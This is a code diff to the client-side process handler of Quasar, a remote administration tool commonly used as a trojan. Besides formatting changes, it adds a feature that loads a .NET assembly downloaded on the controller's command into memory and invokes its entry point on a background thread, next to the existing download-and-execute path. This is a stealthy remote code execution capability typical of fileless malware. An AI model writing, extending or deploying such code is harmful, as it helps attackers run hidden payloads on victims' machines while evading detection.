@@ -10,7 +10,9 @@ using Quasar.Common.Networking;
 using System;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.IO;
 using System.Net;
+using System.Reflection;
 using System.Threading;
 
 namespace Quasar.Client.Messages
@@ -89,7 +91,7 @@ namespace Quasar.Client.Messages
                 // download and then execute
                 if (string.IsNullOrEmpty(message.DownloadUrl))
                 {
-                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                     return;
                 }
 
@@ -110,20 +112,20 @@ namespace Quasar.Client.Messages
                 }
                 catch
                 {
-                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                     NativeMethods.DeleteFile(message.FilePath);
                 }
             }
             else
             {
                 // execute locally
-                ExecuteProcess(message.FilePath, message.IsUpdate);
+                ExecuteProcess(message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet);
             }
         }
 
         private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
         {
-            var message = (DoProcessStart) e.UserState;
+            var message = (DoProcessStart)e.UserState;
             if (e.Cancelled)
             {
                 NativeMethods.DeleteFile(message.FilePath);
@@ -134,7 +136,7 @@ namespace Quasar.Client.Messages
             ExecuteProcess(message.FilePath, message.IsUpdate);
         }
 
-        private void ExecuteProcess(string filePath, bool isUpdate)
+        private void ExecuteProcess(string filePath, bool isUpdate, bool executeInMemory = false)
         {
             if (isUpdate)
             {
@@ -154,19 +156,44 @@ namespace Quasar.Client.Messages
             {
                 try
                 {
-                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    if (executeInMemory)
                     {
-                        UseShellExecute = true,
-                        FileName = filePath
-                    };
-                    Process.Start(startInfo);
-                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                        // Load the assembly into memory and execute it in a separate thread
+                        new Thread(() =>
+                        {
+                            try
+                            {
+                                byte[] assemblyBytes = File.ReadAllBytes(filePath);
+                                Assembly asm = Assembly.Load(assemblyBytes);
+                                MethodInfo entryPoint = asm.EntryPoint;
+                                if (entryPoint != null)
+                                {
+                                    object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[0] };
+                                    entryPoint.Invoke(null, parameters);
+                                }
+                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                            }
+                            catch (Exception ex)
+                            {
+                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                            }
+                        }).Start();
+                    }
+                    else
+                    {
+                        ProcessStartInfo startInfo = new ProcessStartInfo
+                        {
+                            UseShellExecute = true,
+                            FileName = filePath
+                        };
+                        Process.Start(startInfo);
+                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                    }
                 }
                 catch (Exception)
                 {
                     _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                 }
-
             }
         }
 
